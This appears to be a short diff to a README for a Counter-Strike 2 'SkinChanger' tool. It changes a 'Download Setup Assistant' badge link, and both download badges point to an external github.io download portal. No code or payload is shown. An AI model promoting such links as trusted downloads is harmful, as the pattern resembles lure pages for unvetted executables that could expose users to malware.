@@ -1,6 +1,6 @@
 # 🔫 CS2 SkinChanger — Visual Loadout Customizer Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://skinchanger-for-cs2.github.io/.github/cs2)  
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://download-portal-demo.github.io/.github/SkinChange)  
 [![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=counter-strike)](https://download-portal-demo.github.io/.github/Skinchanger)
 
 ---
